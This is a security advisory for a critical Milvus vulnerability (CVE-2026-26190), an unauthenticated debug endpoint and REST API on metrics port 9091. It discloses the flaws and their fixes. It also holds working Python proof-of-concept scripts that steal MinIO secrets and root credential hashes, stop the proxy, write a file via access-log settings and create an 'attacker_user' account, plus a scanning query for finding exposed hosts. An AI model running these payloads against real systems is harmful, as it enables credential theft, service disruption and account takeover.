# Milvus: Unauthenticated Access to Restful API on Metrics Port (9091) Leads to Critical System Compromise

**GHSA**: GHSA-7ppg-37fh-vcr6 | **CVE**: CVE-2026-26190 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-306, CWE-749, CWE-1188

**Affected Packages**:
- **github.com/milvus-io/milvus** (go): < 2.5.27
- **github.com/milvus-io/milvus** (go): >= 2.6.0, < 2.6.10

## Description

## Summary

Milvus exposes TCP port 9091 by default with two critical authentication bypass vulnerabilities:

1. The `/expr` debug endpoint uses a weak, predictable default authentication token derived from `etcd.rootPath` (default: `by-dev`), enabling arbitrary expression evaluation.
2. The full REST API (`/api/v1/*`) is registered on the metrics/management port without any authentication, allowing unauthenticated access to all business operations including data manipulation and credential management.

## Details

### Vulnerability 1: Weak Default Authentication on `/expr` Endpoint

The `/expr` endpoint on port 9091 accepts an `auth` parameter that defaults to the `etcd.rootPath` value (`by-dev`). This value is well-known and predictable. An attacker who can reach port 9091 can evaluate arbitrary internal Go expressions, leading to:

- **Information/Credential Disclosure**: Reading internal configuration values (MinIO secrets, etcd credentials) and user credential hashes via `param.MinioCfg.SecretAccessKey.GetValue()`, `rootcoord.meta.GetCredential(ctx, 'root')`, etc.
- **Denial of Service**: Invoking `proxy.Stop()` to shut down the proxy service.
- **Arbitrary File Write (potential RCE)**: Manipulating access log configuration parameters to write arbitrary content to arbitrary file paths on the server filesystem.

### Vulnerability 2: Unauthenticated REST API on Metrics Port

Business-logic HTTP handlers (collection management, data insertion, credential management) are registered on the metrics/management HTTP server at port 9091 via `registerHTTPServer()` in [`internal/distributed/proxy/service.go` (line 170)](https://github.com/milvus-io/milvus/blob/9996e8d1cebff7e7108bcb16d43124236de77438/internal/distributed/proxy/service.go#L170). These endpoints do not enforce any authentication, even when Milvus authentication is enabled on the primary gRPC/HTTP ports.

An attacker can perform any business operation without credentials, including:

- Creating, listing, and deleting collections
- Inserting and querying data
- Creating, listing, and deleting user credentials
- Modifying user passwords

## Proof of Concept

### PoC 1 — `/expr` Endpoint Exploitation

```python
import requests

url = "http://<target>:9091/expr"

# Leak sensitive configuration (e.g., MinIO secret key)
res = requests.get(url, params={
    "auth": "by-dev",
    "code": "param.MinioCfg.SecretAccessKey.GetValue()"
}, timeout=5)
print(res.json().get("output", ""))

# Retrieve hashed credentials for the root user
res = requests.get(url, params={
    "auth": "by-dev",
    "code": "rootcoord.meta.GetCredential(ctx, 'root')"
}, timeout=5)
print(res.json().get("output", ""))

# Denial of Service — stop the proxy
res = requests.get(url, params={
    "auth": "by-dev",
    "code": "proxy.Stop()"
}, timeout=5)

# Arbitrary file write (potential RCE)
for cmd in [
    'param.Save("proxy.accessLog.localPath", "/tmp")',
    'param.Save("proxy.accessLog.formatters.base.format", "whoami")',
    'param.Save("proxy.accessLog.filename", "evil.sh")',
    'querycoord.etcdCli.KV.Put(ctx, "by-dev/config/proxy/accessLog/enable", "true")'
]:
    requests.get(url, params={"auth": "by-dev", "code": cmd}, timeout=5)
```

### PoC 2 — Unauthenticated REST API Access

```python
import requests

target_url = "http://<target>:9091"

# Create a user without any authentication
res = requests.post(f"{target_url}/api/v1/credential", json={
    "username": "attacker_user",
    "password": "MTIzNDU2Nzg5",
})
print(res.json())

# List all users
res = requests.get(f"{target_url}/api/v1/credential/users")
print(res.json())  # {'status': {}, 'usernames': ['root', 'attacker_user']}

# Create and delete collections, insert data — all without authentication
```

## Internet Exposure

A significant number of publicly exposed Milvus instances are discoverable via internet-wide scanning using the pattern:

```
http.body="404 page not found" && port="9091"
```

This indicates the vulnerability is actively exploitable in real-world production environments.

## Impact

An unauthenticated remote attacker with network access to port 9091 can:

1. **Exfiltrate secrets and credentials** — MinIO keys, etcd credentials, user password hashes, and all internal configuration values.
2. **Manipulate all data** — Create, modify, and delete collections, insert or remove data, bypassing all application-level access controls.
3. **Manage user accounts** — Create administrative users, reset passwords, and escalate privileges.
4. **Cause denial of service** — Shut down proxy services, drop databases, or corrupt metadata.
5. **Write arbitrary files** — Potentially achieve remote code execution by writing malicious files to the filesystem via access log configuration manipulation.

## Remediation

### Recommended Fixes

1. **Remove or disable the `/expr` endpoint** in production builds. If retained for debugging, it must require strong, non-default authentication and be disabled by default.
2. **Do not register business API routes on the metrics port.** Separate the metrics/health endpoints from the application REST API to ensure authentication middleware applies consistently.
3. **Bind port 9091 to localhost by default** (`127.0.0.1:9091`) so it is not externally accessible unless explicitly configured.
4. **Enforce authentication on all API endpoints**, regardless of which port they are served on.

### User Mitigations (until patched)

- Block external access to port 9091 using firewall rules or network policies.
- If running in Docker/Kubernetes, do not expose port 9091 outside the internal network.
- Change the `etcd.rootPath` from the default value `by-dev` to a strong, random value (partial mitigation only — does not address the unauthenticated REST API).

## Credit

This vulnerability was discovered and responsibly reported by **YingLin Xie** (xieyinglin@hust.edu.cn). It was independently reported by [0x1f](https://github.com/0x1f) and zznQ ([ac0d3r](https://github.com/ac0d3r)).
